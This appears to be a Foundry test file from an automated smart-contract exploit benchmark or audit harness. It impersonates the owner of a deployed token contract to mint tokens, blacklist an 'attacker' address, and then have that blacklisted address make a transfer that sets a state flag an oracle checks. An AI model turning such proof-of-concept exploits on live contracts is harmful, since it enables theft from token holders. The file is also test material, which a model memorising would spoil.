// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface BNRG {
    function owner() external view returns (address);
    function setBotProtection(bool enable) external;
    function mint(uint256 numTokens) external returns(bool);
    function transfer(address receiver, uint256 numTokens) external returns (bool);
    function balanceOf(address tokenOwner) external view returns (uint256);
    function state() external view returns (uint8);
    function blacklistAccount(address account, bool blacklisted) external;
}

enum State {
    Locked,
    Restricted,
    Unlocked
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = BNRG(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(attacker, "Attacker");

        // Impersonate owner to set up the contract
        vm.startPrank(owner);
        // Enable bot protection to switch to Restricted mode
        BNRG(TARGET).setBotProtection(true);
        // Mint some tokens to attacker address for testing
        BNRG(TARGET).mint(1000 * 10**18);
        BNRG(TARGET).transfer(attacker, 500 * 10**18);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Contract is in Unlocked state (2), need to trigger lastTx update
        // As owner, blacklist the attacker
        address owner = BNRG(TARGET).owner();
        vm.startPrank(owner);
        BNRG(TARGET).blacklistAccount(attacker, true);
        vm.stopPrank();

        // Create a recipient address
        address recipient = address(0x123);

        // Make sure attacker has tokens (should already have from setup)
        uint256 attackerBalance = BNRG(TARGET).balanceOf(attacker);
        require(attackerBalance > 0, "Attacker needs tokens");

        // Perform a transfer - as blacklisted sender in Unlocked mode,
        // this will set lastTx[attacker] = block.timestamp
        BNRG(TARGET).transfer(recipient, 1 * 10**18);

        // Verify the transfer succeeded
        uint256 recipientBalance = BNRG(TARGET).balanceOf(recipient);
        require(recipientBalance == 1 * 10**18, "Transfer failed");

        // The oracle will check lastTx[attacker] > 0 automatically
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
